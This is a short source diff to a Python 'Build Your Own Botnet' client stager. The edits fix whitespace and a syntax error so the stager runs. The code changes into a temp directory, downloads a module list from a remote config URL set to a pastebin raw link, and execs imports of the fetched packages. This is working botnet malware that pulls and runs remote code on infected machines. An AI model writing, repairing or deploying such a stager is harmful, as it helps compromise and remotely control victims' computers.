@@ -20,14 +20,14 @@ import subprocess
 class Client():
     """
     Client Stager - Build Your Own Botnet
-    """    
-    
+    """
+
     def __init__(self, *args, **kwargs):
         self._reload = False
         self.debug   = kwargs.get('debug')
         self.config  = kwargs.get('config')
 
-        
+
     def _debug(self, text):
         if self.__debug:
             print(str(text))
@@ -76,7 +76,7 @@ class Client():
             else:
                 os.chdir(os.path.expandvars('%TEMP%')) if os.name == 'nt' else os.chdir('/tmp')
                 packages = json.loads(urllib.urlopen(config['modules']).read())
-                arch = str(struct.calcsize('P') * 8))
+                arch = str(struct.calcsize('P') * 8)               
                 for name, url in packages[os.name][arch].items():
                     try:
                         exec "import %s" % name in globals()
@@ -110,4 +110,4 @@ class Client():
 if __name__=='__main__':
     __debug = bool('--debug' in sys.argv)
     client  = Client(config='https://pastebin.com/raw/yt6GnYx4', debug=True)
-    
+
